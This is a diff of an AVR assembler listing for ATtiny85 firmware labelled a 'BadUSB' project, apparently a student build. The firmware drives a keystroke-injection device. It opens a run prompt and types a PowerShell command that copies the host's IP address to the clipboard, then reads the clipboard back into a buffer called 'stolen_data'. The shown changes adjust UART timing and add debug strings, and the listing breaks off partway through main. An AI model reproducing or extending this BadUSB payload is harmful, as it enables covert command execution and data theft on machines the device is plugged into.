@@ -1,5 +1,5 @@
 
-AVRASM ver. 2.1.30  C:\Users\Surface\Documents\CSL_Project2\codevision\Debug\List\main.asm Sun Feb 15 05:44:01 2026
+AVRASM ver. 2.1.30  C:\Users\Surface\Documents\CSL_Project_Main\codevision\Debug\List\vay.asm Sun Feb 15 13:30:09 2026
 
                  
                  
@@ -1070,7 +1070,7 @@ AVRASM ver. 2.1.30  C:\Users\Surface\Documents\CSL_Project2\codevision\Debug\Lis
                  __START_OF_CODE:
                  
                  ;INTERRUPT VECTORS
-000000 c057      	RJMP __RESET
+000000 c0c0      	RJMP __RESET
 000001 cffe      	RJMP 0x00
 000002 cffd      	RJMP 0x00
 000003 cffc      	RJMP 0x00
@@ -1091,126 +1091,229 @@ AVRASM ver. 2.1.30  C:\Users\Surface\Documents\CSL_Project2\codevision\Debug\Lis
 000010 3a44
 000011 5552
 000012 0a4e      	.DB  0x43,0x4D,0x44,0x3A,0x52,0x55,0x4E,0xA
-C:\Users\Surface\Documents\CSL_Project2\codevision\Debug\List\main.asm(1087): warning: .cseg .db misalignment - padding zero byte
+C:\Users\Surface\Documents\CSL_Project_Main\codevision\Debug\List\vay.asm(1087): warning: .cseg .db misalignment - padding zero byte
 000013 0000      	.DB  0x0
-                 _CMD_GET_IP:
-000014 5954
-000015 4550
-000016 703a
-000017 776f      	.DB  0x54,0x59,0x50,0x45,0x3A,0x70,0x6F,0x77
-000018 7265
-000019 6873
-00001a 6c65
-00001b 206c      	.DB  0x65,0x72,0x73,0x68,0x65,0x6C,0x6C,0x20
-00001c 5322
-00001d 7465
-00001e 432d
-00001f 696c      	.DB  0x22,0x53,0x65,0x74,0x2D,0x43,0x6C,0x69
-000020 6270
-000021 616f
-000022 6472
-000023 2d20      	.DB  0x70,0x62,0x6F,0x61,0x72,0x64,0x20,0x2D
-000024 6156
-000025 756c
-000026 2065
-000027 4728      	.DB  0x56,0x61,0x6C,0x75,0x65,0x20,0x28,0x47
-000028 7465
-000029 4e2d
-00002a 7465
-00002b 5049      	.DB  0x65,0x74,0x2D,0x4E,0x65,0x74,0x49,0x50
-00002c 6441
-00002d 7264
-00002e 7365
-00002f 2073      	.DB  0x41,0x64,0x64,0x72,0x65,0x73,0x73,0x20
-000030 412d
-000031 6464
-000032 6572
-000033 7373      	.DB  0x2D,0x41,0x64,0x64,0x72,0x65,0x73,0x73
-000034 6146
-000035 696d
-000036 796c
-000037 4920      	.DB  0x46,0x61,0x6D,0x69,0x6C,0x79,0x20,0x49
-000038 7650
-000039 2934
-00003a 492e
-00003b 4150      	.DB  0x50,0x76,0x34,0x29,0x2E,0x49,0x50,0x41
-00003c 6464
-00003d 6572
-00003e 7373
-00003f 305b      	.DB  0x64,0x64,0x72,0x65,0x73,0x73,0x5B,0x30
-000040 225d
-000041 000a      	.DB  0x5D,0x22,0xA,0x0
                  _KEY_ENTER:
-000042 454b
-000043 3a59
-000044 4e45
-000045 4554      	.DB  0x4B,0x45,0x59,0x3A,0x45,0x4E,0x54,0x45
-000046 0a52
-C:\Users\Surface\Documents\CSL_Project2\codevision\Debug\List\main.asm(1103): warning: .cseg .db misalignment - padding zero byte
-000047 0000      	.DB  0x52,0xA,0x0
-                 _CMD_ASK_DATA:
-000048 4341
-000049 4954
-00004a 4e4f
-00004b 473a      	.DB  0x41,0x43,0x54,0x49,0x4F,0x4E,0x3A,0x47
-00004c 5445
-00004d 435f
-00004e 494c
-00004f 0a50      	.DB  0x45,0x54,0x5F,0x43,0x4C,0x49,0x50,0xA
-C:\Users\Surface\Documents\CSL_Project2\codevision\Debug\List\main.asm(1107): warning: .cseg .db misalignment - padding zero byte
-000050 0000      	.DB  0x0
+000014 454b
+000015 3a59
+000016 4e45
+000017 4554      	.DB  0x4B,0x45,0x59,0x3A,0x45,0x4E,0x54,0x45
+000018 0a52
+C:\Users\Surface\Documents\CSL_Project_Main\codevision\Debug\List\vay.asm(1090): warning: .cseg .db misalignment - padding zero byte
+000019 0000      	.DB  0x52,0xA,0x0
                  
                  _0x0:
-000051 5954
-000052 4550
-000053 6e3a
-000054 746f      	.DB  0x54,0x59,0x50,0x45,0x3A,0x6E,0x6F,0x74
-000055 7065
-000056 6461
-000057 000a      	.DB  0x65,0x70,0x61,0x64,0xA,0x0
+00001a 4544
+00001b 5542
+00001c 3a47
+00001d 2a20      	.DB  0x44,0x45,0x42,0x55,0x47,0x3A,0x20,0x2A
+00001e 2a2a
+00001f 4220
+000020 4f4f
+000021 4954      	.DB  0x2A,0x2A,0x20,0x42,0x4F,0x4F,0x54,0x49
+000022 474e
+000023 5520
+000024 2050
+000025 2a2a      	.DB  0x4E,0x47,0x20,0x55,0x50,0x20,0x2A,0x2A
+000026 0a2a
+000027 4400
+000028 4245
+000029 4755      	.DB  0x2A,0xA,0x0,0x44,0x45,0x42,0x55,0x47
+00002a 503a
+00002b 6168
+00002c 6573
+00002d 3120      	.DB  0x3A,0x50,0x68,0x61,0x73,0x65,0x20,0x31
+00002e 2d20
+00002f 4720
+000030 7465
+000031 6974      	.DB  0x20,0x2D,0x20,0x47,0x65,0x74,0x74,0x69
+000032 676e
+000033 4920
+000034 0a50
+000035 5400      	.DB  0x6E,0x67,0x20,0x49,0x50,0xA,0x0,0x54
+000036 5059
+000037 3a45
+000038 6f70
+000039 6577      	.DB  0x59,0x50,0x45,0x3A,0x70,0x6F,0x77,0x65
+00003a 7372
+00003b 6568
+00003c 6c6c
+00003d 2220      	.DB  0x72,0x73,0x68,0x65,0x6C,0x6C,0x20,0x22
+00003e 6553
+00003f 2d74
+000040 6c43
+000041 7069      	.DB  0x53,0x65,0x74,0x2D,0x43,0x6C,0x69,0x70
+000042 6f62
+000043 7261
+000044 2064
+000045 562d      	.DB  0x62,0x6F,0x61,0x72,0x64,0x20,0x2D,0x56
+000046 6c61
+000047 6575
+000048 2820
+000049 6547      	.DB  0x61,0x6C,0x75,0x65,0x20,0x28,0x47,0x65
+00004a 2d74
+00004b 654e
+00004c 4974
+00004d 4150      	.DB  0x74,0x2D,0x4E,0x65,0x74,0x49,0x50,0x41
+00004e 6464
+00004f 6572
+000050 7373
+000051 2d20      	.DB  0x64,0x64,0x72,0x65,0x73,0x73,0x20,0x2D
+000052 6441
+000053 7264
+000054 7365
+000055 4673      	.DB  0x41,0x64,0x64,0x72,0x65,0x73,0x73,0x46
+000056 6d61
+000057 6c69
+000058 2079
+000059 5049      	.DB  0x61,0x6D,0x69,0x6C,0x79,0x20,0x49,0x50
+00005a 3476
+00005b 2e29
+00005c 5049
+00005d 6441      	.DB  0x76,0x34,0x29,0x2E,0x49,0x50,0x41,0x64
+00005e 7264
+00005f 7365
+000060 5b73
+000061 5d30      	.DB  0x64,0x72,0x65,0x73,0x73,0x5B,0x30,0x5D
+000062 0a22
+000063 4100
+000064 5443
+000065 4f49      	.DB  0x22,0xA,0x0,0x41,0x43,0x54,0x49,0x4F
+000066 3a4e
+000067 4547
+000068 5f54
+000069 4c43      	.DB  0x4E,0x3A,0x47,0x45,0x54,0x5F,0x43,0x4C
+00006a 5049
+00006b 000a
+00006c 4544
+00006d 5542      	.DB  0x49,0x50,0xA,0x0,0x44,0x45,0x42,0x55
+00006e 3a47
+00006f 4920
+000070 2050
+000071 6153      	.DB  0x47,0x3A,0x20,0x49,0x50,0x20,0x53,0x61
+000072 6576
+000073 2e64
+000074 4520
+000075 746e      	.DB  0x76,0x65,0x64,0x2E,0x20,0x45,0x6E,0x74
+000076 7265
+000077 6e69
+000078 2067
+000079 6850      	.DB  0x65,0x72,0x69,0x6E,0x67,0x20,0x50,0x68
+00007a 7361
+00007b 2065
+00007c 2032
+00007d 4c28      	.DB  0x61,0x73,0x65,0x20,0x32,0x20,0x28,0x4C
+00007e 6f6f
+00007f 2970
+000080 0a2e
+000081 4400      	.DB  0x6F,0x6F,0x70,0x29,0x2E,0xA,0x0,0x44
+000082 4245
+000083 4755
+000084 423a
+000085 7475      	.DB  0x45,0x42,0x55,0x47,0x3A,0x42,0x75,0x74
+000086 6f74
+000087 206e
+000088 7250
+000089 7365      	.DB  0x74,0x6F,0x6E,0x20,0x50,0x72,0x65,0x73
+00008a 6573
+00008b 2164
+00008c 000a
+00008d 5954      	.DB  0x73,0x65,0x64,0x21,0xA,0x0,0x54,0x59
+00008e 4550
+00008f 6e3a
+000090 746f
+000091 7065      	.DB  0x50,0x45,0x3A,0x6E,0x6F,0x74,0x65,0x70
+000092 6461
+000093 000a
+000094 5954
+000095 4550      	.DB  0x61,0x64,0xA,0x0,0x54,0x59,0x50,0x45
+000096 593a
+000097 756f
+000098 2072
+000099 5049      	.DB  0x3A,0x59,0x6F,0x75,0x72,0x20,0x49,0x50
+00009a 6920
+00009b 3a73
+00009c 0020
+00009d 4544      	.DB  0x20,0x69,0x73,0x3A,0x20,0x0,0x44,0x45
+00009e 5542
+00009f 3a47
+0000a0 6f44
+0000a1 656e      	.DB  0x42,0x55,0x47,0x3A,0x44,0x6F,0x6E,0x65
+0000a2 5420
+0000a3 7079
+0000a4 6e69
+0000a5 2e67      	.DB  0x20,0x54,0x79,0x70,0x69,0x6E,0x67,0x2E
+0000a6 5220
+0000a7 6c65
+0000a8 6165
+0000a9 6573      	.DB  0x20,0x52,0x65,0x6C,0x65,0x61,0x73,0x65
+0000aa 4220
+0000ab 7475
+0000ac 6f74
+0000ad 2e6e      	.DB  0x20,0x42,0x75,0x74,0x74,0x6F,0x6E,0x2E
+0000ae 000a
+0000af 4544
+0000b0 5542
+0000b1 3a47      	.DB  0xA,0x0,0x44,0x45,0x42,0x55,0x47,0x3A
+0000b2 7542
+0000b3 7474
+0000b4 6e6f
+0000b5 5220      	.DB  0x42,0x75,0x74,0x74,0x6F,0x6E,0x20,0x52
+0000b6 6c65
+0000b7 6165
+0000b8 6573
+0000b9 2e64      	.DB  0x65,0x6C,0x65,0x61,0x73,0x65,0x64,0x2E
+0000ba 5720
+0000bb 6961
+0000bc 6974
+0000bd 676e      	.DB  0x20,0x57,0x61,0x69,0x74,0x69,0x6E,0x67
+0000be 2e2e
+0000bf 0a2e
+C:\Users\Surface\Documents\CSL_Project_Main\codevision\Debug\List\vay.asm(1134): warning: .cseg .db misalignment - padding zero byte
+0000c0 0000      	.DB  0x2E,0x2E,0x2E,0xA,0x0
                  __RESET:
-000058 94f8      	CLI
-000059 27ee      	CLR  R30
-00005a bbec      	OUT  EECR,R30
-00005b bfe5      	OUT  MCUCR,R30
+0000c1 94f8      	CLI
+0000c2 27ee      	CLR  R30
+0000c3 bbec      	OUT  EECR,R30
+0000c4 bfe5      	OUT  MCUCR,R30
                  
                  ;CLEAR R2-R14
-00005c e08d      	LDI  R24,(14-2)+1
-00005d e0a2      	LDI  R26,2
-00005e 27bb      	CLR  R27
+0000c5 e08d      	LDI  R24,(14-2)+1
+0000c6 e0a2      	LDI  R26,2
+0000c7 27bb      	CLR  R27
                  __CLEAR_REG:
-00005f 93ed      	ST   X+,R30
-000060 958a      	DEC  R24
-000061 f7e9      	BRNE __CLEAR_REG
+0000c8 93ed      	ST   X+,R30
+0000c9 958a      	DEC  R24
+0000ca f7e9      	BRNE __CLEAR_REG
                  
                  ;CLEAR SRAM
-000062 e080      	LDI  R24,LOW(__CLEAR_SRAM_SIZE)
-000063 e092      	LDI  R25,HIGH(__CLEAR_SRAM_SIZE)
-000064 e6a0      	LDI  R26,__SRAM_START
+0000cb e080      	LDI  R24,LOW(__CLEAR_SRAM_SIZE)
+0000cc e092      	LDI  R25,HIGH(__CLEAR_SRAM_SIZE)
+0000cd e6a0      	LDI  R26,__SRAM_START
                  __CLEAR_SRAM:
-000065 93ed      	ST   X+,R30
-000066 9701      	SBIW R24,1
-000067 f7e9      	BRNE __CLEAR_SRAM
+0000ce 93ed      	ST   X+,R30
+0000cf 9701      	SBIW R24,1
+0000d0 f7e9      	BRNE __CLEAR_SRAM
                  
                  ;GPIOR0-GPIOR2 INITIALIZATION
-000068 e0e0      	LDI  R30,__GPIOR0_INIT
-000069 bbe1      	OUT  GPIOR0,R30
+0000d1 e0e0      	LDI  R30,__GPIOR0_INIT
+0000d2 bbe1      	OUT  GPIOR0,R30
                  	;__GPIOR1_INIT = __GPIOR0_INIT
-00006a bbe2      	OUT  GPIOR1,R30
+0000d3 bbe2      	OUT  GPIOR1,R30
                  	;__GPIOR2_INIT = __GPIOR0_INIT
-00006b bbe3      	OUT  GPIOR2,R30
+0000d4 bbe3      	OUT  GPIOR2,R30
                  
                  ;HARDWARE STACK POINTER INITIALIZATION
-00006c e5ef      	LDI  R30,LOW(__SRAM_END-__HEAP_SIZE)
-00006d bfed      	OUT  SPL,R30
-00006e e0e2      	LDI  R30,HIGH(__SRAM_END-__HEAP_SIZE)
-00006f bfee      	OUT  SPH,R30
+0000d5 e5ef      	LDI  R30,LOW(__SRAM_END-__HEAP_SIZE)
+0000d6 bfed      	OUT  SPL,R30
+0000d7 e0e2      	LDI  R30,HIGH(__SRAM_END-__HEAP_SIZE)
+0000d8 bfee      	OUT  SPH,R30
                  
                  ;DATA STACK POINTER INITIALIZATION
-000070 eec0      	LDI  R28,LOW(__SRAM_START+__DSTACK_SIZE)
-000071 e0d0      	LDI  R29,HIGH(__SRAM_START+__DSTACK_SIZE)
+0000d9 eec0      	LDI  R28,LOW(__SRAM_START+__DSTACK_SIZE)
+0000da e0d0      	LDI  R29,HIGH(__SRAM_START+__DSTACK_SIZE)
                  
-000072 c043      	RJMP _main
+0000db c052      	RJMP _main
                  
                  	.ESEG
                  	.ORG 0
@@ -1220,7 +1323,7 @@ C:\Users\Surface\Documents\CSL_Project2\codevision\Debug\List\main.asm(1107): wa
                  
                  	.CSEG
                  ;/*******************************************************
-                 ;Project : Real BadUSB Final Fix v2
+                 ;Project : Debugged BadUSB Final
                  ;Chip    : ATtiny85
                  ;Clock   : 8.000000 MHz
                  ;*******************************************************/
@@ -1241,404 +1344,478 @@ C:\Users\Surface\Documents\CSL_Project2\codevision\Debug\List\main.asm(1107): wa
                  ;#define TX_DDR DDRB.0
                  ;#define RX_PIN PINB.1
                  ;#define RX_DDR DDRB.1
+                 ;// ???? ??? ???? 3 ?????? (PB4)
                  ;#define BTN_PIN PINB.4
                  ;#define BTN_DDR DDRB.4
                  ;#define BTN_PORT PORTB.4
                  ;
-                 ;#define BIT_DELAY_US 104
-                 ;#define HALF_BIT_DELAY_US 52
+                 ;#define BIT_DELAY_US 208    // ???? 104 ???
+                 ;#define HALF_BIT_DELAY_US 104 // ???? 52 ???
                  ;
-                 ;char stolen_data[32];
+                 ;char stolen_data[35]; // ?????? ??? ???? ???? ???????
                  ;
                  ;void uart_tx(char data) {
-                 ; 0000 0017 void uart_tx(char data) {
+                 ; 0000 0018 void uart_tx(char data) {
                  
                  	.CSEG
                  _uart_tx:
                  ; .FSTART _uart_tx
-                 ; 0000 0018     unsigned char i;
-                 ; 0000 0019     TX_PIN = 0; delay_us(BIT_DELAY_US);
-000073 93aa      	ST   -Y,R26
-000074 931a      	ST   -Y,R17
+                 ; 0000 0019     unsigned char i;
+                 ; 0000 001A     TX_PIN = 0; delay_us(BIT_DELAY_US);
+0000dc 93aa      	ST   -Y,R26
+0000dd 931a      	ST   -Y,R17
                  ;	data -> Y+1
                  ;	i -> R17
-000075 98c0      	CBI  0x18,0
-000076 d08a      	RCALL SUBOPT_0x0
-                 ; 0000 001A     for (i = 0; i < 8; i++) {
-000077 e010      	LDI  R17,LOW(0)
+0000de 98c0      	CBI  0x18,0
+0000df d0bc      	RCALL SUBOPT_0x0
+                 ; 0000 001B     for (i = 0; i < 8; i++) {
+0000e0 e010      	LDI  R17,LOW(0)
                  _0x6:
-000078 3018      	CPI  R17,8
-000079 f460      	BRSH _0x7
-                 ; 0000 001B         if (data & 1) TX_PIN = 1; else TX_PIN = 0;
-00007a 81e9      	LDD  R30,Y+1
-00007b 70e1      	ANDI R30,LOW(0x1)
-00007c f011      	BREQ _0x8
-00007d 9ac0      	SBI  0x18,0
-00007e c001      	RJMP _0xB
+0000e1 3018      	CPI  R17,8
+0000e2 f460      	BRSH _0x7
+                 ; 0000 001C         if (data & 1) TX_PIN = 1; else TX_PIN = 0;
+0000e3 81e9      	LDD  R30,Y+1
+0000e4 70e1      	ANDI R30,LOW(0x1)
+0000e5 f011      	BREQ _0x8
+0000e6 9ac0      	SBI  0x18,0
+0000e7 c001      	RJMP _0xB
                  _0x8:
-00007f 98c0      	CBI  0x18,0
-                 ; 0000 001C         data >>= 1; delay_us(BIT_DELAY_US);
+0000e8 98c0      	CBI  0x18,0
+                 ; 0000 001D         data >>= 1; delay_us(BIT_DELAY_US);
                  _0xB:
-000080 81e9      	LDD  R30,Y+1
-000081 95e6      	LSR  R30
-000082 83e9      	STD  Y+1,R30
-000083 d07d      	RCALL SUBOPT_0x0
-                 ; 0000 001D     }
-000084 5f1f      	SUBI R17,-1
-000085 cff2      	RJMP _0x6
+0000e9 81e9      	LDD  R30,Y+1
+0000ea 95e6      	LSR  R30
+0000eb 83e9      	STD  Y+1,R30
+0000ec d0af      	RCALL SUBOPT_0x0
+                 ; 0000 001E     }
+0000ed 5f1f      	SUBI R17,-1
+0000ee cff2      	RJMP _0x6
                  _0x7:
-                 ; 0000 001E     TX_PIN = 1; delay_us(BIT_DELAY_US);
-000086 9ac0      	SBI  0x18,0
-000087 d079      	RCALL SUBOPT_0x0
-                 ; 0000 001F }
-000088 8118      	LDD  R17,Y+0
-000089 c010      	RJMP _0x2000002
+                 ; 0000 001F     TX_PIN = 1; delay_us(BIT_DELAY_US);
+0000ef 9ac0      	SBI  0x18,0
+0000f0 d0ab      	RCALL SUBOPT_0x0
+                 ; 0000 0020 }
+0000f1 8118      	LDD  R17,Y+0
+0000f2 c01e      	RJMP _0x2000002
                  ; .FEND
                  ;
                  ;void uart_print_flash(flash char *str) {
-                 ; 0000 0021 void uart_print_flash(flash char *str) {
+                 ; 0000 0022 void uart_print_flash(flash char *str) {
                  _uart_print_flash:
                  ; .FSTART _uart_print_flash
-                 ; 0000 0022     while (*str) uart_tx(*str++);
-00008a 93ba      	ST   -Y,R27
-00008b 93aa      	ST   -Y,R26
+                 ; 0000 0023     while (*str) uart_tx(*str++);
+0000f3 93ba      	ST   -Y,R27
+0000f4 93aa      	ST   -Y,R26
                  ;	*str -> Y+0
                  _0x10:
-00008c 81e8      	LD   R30,Y
-00008d 81f9      	LDD  R31,Y+1
-00008e 91e4      	LPM  R30,Z
-00008f 30e0      	CPI  R30,0
-000090 f049      	BREQ _0x12
-000091 81e8      	LD   R30,Y
-000092 81f9      	LDD  R31,Y+1
-000093 9631      	ADIW R30,1
-000094 83e8      	ST   Y,R30
-000095 83f9      	STD  Y+1,R31
-000096 9731      	SBIW R30,1
-000097 91a4      	LPM  R26,Z
-000098 dfda      	RCALL _uart_tx
-000099 cff2      	RJMP _0x10
+0000f5 81e8      	LD   R30,Y
+0000f6 81f9      	LDD  R31,Y+1
+0000f7 91e4      	LPM  R30,Z
+0000f8 30e0      	CPI  R30,0
+0000f9 f049      	BREQ _0x12
+0000fa 81e8      	LD   R30,Y
+0000fb 81f9      	LDD  R31,Y+1
+0000fc 9631      	ADIW R30,1
+0000fd 83e8      	ST   Y,R30
+0000fe 83f9      	STD  Y+1,R31
+0000ff 9731      	SBIW R30,1
+000100 91a4      	LPM  R26,Z
+000101 dfda      	RCALL _uart_tx
+000102 cff2      	RJMP _0x10
                  _0x12:
-                 ; 0000 0023 }
-                 _0x2000002:
-00009a 9622      	ADIW R28,2
-00009b 9508      	RET
+                 ; 0000 0024 }
+000103 c00d      	RJMP _0x2000002
                  ; .FEND
                  ;
                  ;void uart_print_ram(char *str) {
-                 ; 0000 0025 void uart_print_ram(char *str) {
-                 ; 0000 0026     while (*str) uart_tx(*str++);
+                 ; 0000 0026 void uart_print_ram(char *str) {
+                 _uart_print_ram:
+                 ; .FSTART _uart_print_ram
+                 ; 0000 0027     while (*str) uart_tx(*str++);
+000104 93ba      	ST   -Y,R27
+000105 93aa      	ST   -Y,R26
                  ;	*str -> Y+0
-                 ; 0000 0027 }
+                 _0x13:
+000106 81a8      	LD   R26,Y
+000107 81b9      	LDD  R27,Y+1
+000108 91ec      	LD   R30,X
+000109 30e0      	CPI  R30,0
+00010a f031      	BREQ _0x15
+00010b 91ed      	LD   R30,X+
+00010c 83a8      	ST   Y,R26
+00010d 83b9      	STD  Y+1,R27
+00010e 2fae      	MOV  R26,R30
+00010f dfcc      	RCALL _uart_tx
+000110 cff5      	RJMP _0x13
+                 _0x15:
+                 ; 0000 0028 }
+                 _0x2000002:
+000111 9622      	ADIW R28,2
+000112 9508      	RET
+                 ; .FEND
                  ;
                  ;char uart_rx(void) {
-                 ; 0000 0029 char uart_rx(void) {
+                 ; 0000 002A char uart_rx(void) {
                  _uart_rx:
                  ; .FSTART _uart_rx
-                 ; 0000 002A     unsigned char i;
-                 ; 0000 002B     char data = 0;
-                 ; 0000 002C     while (RX_PIN == 1);
-00009c d090      	RCALL __SAVELOCR2
+                 ; 0000 002B     unsigned char i;
+                 ; 0000 002C     char data = 0;
+                 ; 0000 002D     while (RX_PIN == 1);
+000113 d0a6      	RCALL __SAVELOCR2
                  ;	i -> R17
                  ;	data -> R16
-00009d e000      	LDI  R16,0
+000114 e000      	LDI  R16,0
                  _0x16:
-00009e 99b1      	SBIC 0x16,1
-00009f cffe      	RJMP _0x16
-                 ; 0000 002D     delay_us(HALF_BIT_DELAY_US);
+000115 99b1      	SBIC 0x16,1
+000116 cffe      	RJMP _0x16
+                 ; 0000 002E     delay_us(HALF_BIT_DELAY_US);
                 +
-0000a0 e88b     +LDI R24 , LOW ( 139 )
-                +__DELAY_USB_LOOP :
-0000a1 958a     +DEC R24
-0000a2 f7f1     +BRNE __DELAY_USB_LOOP
-                 	__DELAY_USB 139
-                 ; 0000 002E     if (RX_PIN == 1) return 0;
-0000a3 9bb1      	SBIS 0x16,1
-0000a4 c002      	RJMP _0x19
-0000a5 e0e0      	LDI  R30,LOW(0)
-0000a6 c00c      	RJMP _0x2000001
-                 ; 0000 002F     delay_us(BIT_DELAY_US);
+000117 ed80     +LDI R24 , LOW ( 208 )
+000118 e090     +LDI R25 , HIGH ( 208 )
+                +__DELAY_USW_LOOP :
+000119 9701     +SBIW R24 , 1
+00011a f7f1     +BRNE __DELAY_USW_LOOP
+                 	__DELAY_USW 208
+                 ; 0000 002F     if (RX_PIN == 1) return 0;
+00011b 9bb1      	SBIS 0x16,1
+00011c c002      	RJMP _0x19
+00011d e0e0      	LDI  R30,LOW(0)
+00011e c00c      	RJMP _0x2000001
+                 ; 0000 0030     delay_us(BIT_DELAY_US);
                  _0x19:
-0000a7 d059      	RCALL SUBOPT_0x0
-                 ; 0000 0030     for (i = 0; i < 8; i++) {
-0000a8 e010      	LDI  R17,LOW(0)
+00011f d07c      	RCALL SUBOPT_0x0
+                 ; 0000 0031     for (i = 0; i < 8; i++) {
+000120 e010      	LDI  R17,LOW(0)
                  _0x1B:
-0000a9 3018      	CPI  R17,8
-0000aa f430      	BRSH _0x1C
-                 ; 0000 0031         data >>= 1;
-0000ab 9506      	LSR  R16
-                 ; 0000 0032         if (RX_PIN == 1) data |= 0x80;
-0000ac 99b1      	SBIC 0x16,1
-0000ad 6800      	ORI  R16,LOW(128)
-                 ; 0000 0033         delay_us(BIT_DELAY_US);
-0000ae d052      	RCALL SUBOPT_0x0
-                 ; 0000 0034     }
-0000af 5f1f      	SUBI R17,-1
-0000b0 cff8      	RJMP _0x1B
+000121 3018      	CPI  R17,8
+000122 f430      	BRSH _0x1C
+                 ; 0000 0032         data >>= 1;
+000123 9506      	LSR  R16
+                 ; 0000 0033         if (RX_PIN == 1) data |= 0x80;
+000124 99b1      	SBIC 0x16,1
+000125 6800      	ORI  R16,LOW(128)
+                 ; 0000 0034         delay_us(BIT_DELAY_US);
+000126 d075      	RCALL SUBOPT_0x0
+                 ; 0000 0035     }
+000127 5f1f      	SUBI R17,-1
+000128 cff8      	RJMP _0x1B
                  _0x1C:
-                 ; 0000 0035     delay_us(BIT_DELAY_US);
-0000b1 d04f      	RCALL SUBOPT_0x0
-                 ; 0000 0036     return data;
-0000b2 2fe0      	MOV  R30,R16
+                 ; 0000 0036     delay_us(BIT_DELAY_US);
+000129 d072      	RCALL SUBOPT_0x0
+                 ; 0000 0037     return data;
+00012a 2fe0      	MOV  R30,R16
                  _0x2000001:
-0000b3 9109      	LD   R16,Y+
-0000b4 9119      	LD   R17,Y+
-0000b5 9508      	RET
-                 ; 0000 0037 }
+00012b 9109      	LD   R16,Y+
+00012c 9119      	LD   R17,Y+
+00012d 9508      	RET
+                 ; 0000 0038 }
                  ; .FEND
                  ;
                  ;flash char CMD_RUN[] = "CMD:RUN\n";
-                 ;flash char CMD_GET_IP[] = "TYPE:powershell \"Set-Clipboard -Value (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\"\ ...
                  ;flash char KEY_ENTER[] = "KEY:ENTER\n";
-                 ;flash char CMD_ASK_DATA[] = "ACTION:GET_CLIP\n";
-                 ;flash char HEADER_TEXT[] = "TYPE:Extracted IP: \n";
-                 ;// *** «÷«›Â ‘œÂ: ÅÌ‘Ê‰œ  «ÌÅ ***
-                 ;flash char CMD_TYPE_PREFIX[] = "TYPE:";
                  ;
                  ;void main(void) {
-                 ; 0000 0041 void main(void) {
+                 ; 0000 003D void main(void) {
                  _main:
                  ; .FSTART _main
-                 ; 0000 0042     int i;
-                 ; 0000 0043 
-                 ; 0000 0044     TX_DDR = 1; TX_PIN = 1;
+                 ; 0000 003E     int i;
+                 ; 0000 003F 
+                 ; 0000 0040     // 1. ??????? ?????
+                 ; 0000 0041     TX_DDR = 1; TX_PIN = 1;
                  ;	i -> R16,R17
-0000b6 9ab8      	SBI  0x17,0
-0000b7 9ac0      	SBI  0x18,0
-                 ; 0000 0045     RX_DDR = 0;
-0000b8 98b9      	CBI  0x17,1
-                 ; 0000 0046     BTN_DDR = 0; BTN_PORT = 1;
-0000b9 98bc      	CBI  0x17,4
-0000ba 9ac4      	SBI  0x18,4
-                 ; 0000 0047 
-                 ; 0000 0048     delay_ms(1000);
-0000bb d04a      	RCALL SUBOPT_0x1
-                 ; 0000 0049 
-                 ; 0000 004A     // --- ›«“ 1: Õ„·Â ---
-                 ; 0000 004B     uart_print_flash(CMD_RUN);
-                 ; 0000 004C     delay_ms(500);
-                 ; 0000 004D     uart_print_flash(CMD_GET_IP);
-                 ; 0000 004E     delay_ms(500);
-                 ; 0000 004F     uart_print_flash(KEY_ENTER);
-                 ; 0000 0050     delay_ms(2500);
-0000bc eca4      	LDI  R26,LOW(2500)
-0000bd e0b9      	LDI  R27,HIGH(2500)
-0000be d059      	RCALL SUBOPT_0x2
-                 ; 0000 0051 
-                 ; 0000 0052     uart_print_flash(CMD_ASK_DATA);
-                 ; 0000 0053 
-                 ; 0000 0054     for(i=0; i<32; i++) stolen_data[i] = 0;
+00012e 9ab8      	SBI  0x17,0
+00012f 9ac0      	SBI  0x18,0
+                 ; 0000 0042     RX_DDR = 0;
+000130 98b9      	CBI  0x17,1
+                 ; 0000 0043     BTN_DDR = 0; BTN_PORT = 1; // Pull-up ????? ????
+000131 98bc      	CBI  0x17,4
+000132 9ac4      	SBI  0x18,4
+                 ; 0000 0044 
+                 ; 0000 0045     delay_ms(500);
+000133 d06d      	RCALL SUBOPT_0x1
+                 ; 0000 0046 
+                 ; 0000 0047     // *** ??? ????: ??? ???? ??? ?? ??? ???? ??? ??? ????? ***
+                 ; 0000 0048     uart_print_flash("DEBUG: *** BOOTING UP ***\n");
                 +
-0000bf e000     +LDI R16 , LOW ( 0 )
-0000c0 e010     +LDI R17 , HIGH ( 0 )
+000134 e3a4     +LDI R26 , LOW ( 2 * _0x0 + ( 0 ) )
+000135 e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 0 ) )
+                 	__POINTW2FN _0x0,0
+000136 dfbc      	RCALL _uart_print_flash
+                 ; 0000 0049 
+                 ; 0000 004A     // --- ??? 1: ?????? ????? ---
+                 ; 0000 004B     uart_print_flash("DEBUG:Phase 1 - Getting IP\n");
+                +
+000137 e4af     +LDI R26 , LOW ( 2 * _0x0 + ( 27 ) )
+000138 e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 27 ) )
+                 	__POINTW2FN _0x0,27
+000139 d06a      	RCALL SUBOPT_0x2
+                 ; 0000 004C 
+                 ; 0000 004D     uart_print_flash(CMD_RUN);
+                 ; 0000 004E     delay_ms(500);
+                 ; 0000 004F     // ????? ??????
+                 ; 0000 0050     uart_print_flash("TYPE:powershell \"Set-Clipboard -Value (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\"\n");
+                +
+00013a e6ab     +LDI R26 , LOW ( 2 * _0x0 + ( 55 ) )
+00013b e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 55 ) )
+                 	__POINTW2FN _0x0,55
+00013c dfb6      	RCALL _uart_print_flash
+                 ; 0000 0051     delay_ms(500);
+00013d d063      	RCALL SUBOPT_0x1
+                 ; 0000 0052     uart_print_flash(KEY_ENTER);
+00013e e2a8      	LDI  R26,LOW(_KEY_ENTER*2)
+00013f e0b0      	LDI  R27,HIGH(_KEY_ENTER*2)
+000140 dfb2      	RCALL _uart_print_flash
+                 ; 0000 0053 
+                 ; 0000 0054     delay_ms(3000); // ??? ???? ????? ??????
+000141 eba8      	LDI  R26,LOW(3000)
+000142 e0bb      	LDI  R27,HIGH(3000)
+000143 d06c      	RCALL _delay_ms
+                 ; 0000 0055 
+                 ; 0000 0056     uart_print_flash("ACTION:GET_CLIP\n");
+                +
+000144 eca7     +LDI R26 , LOW ( 2 * _0x0 + ( 147 ) )
+000145 e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 147 ) )
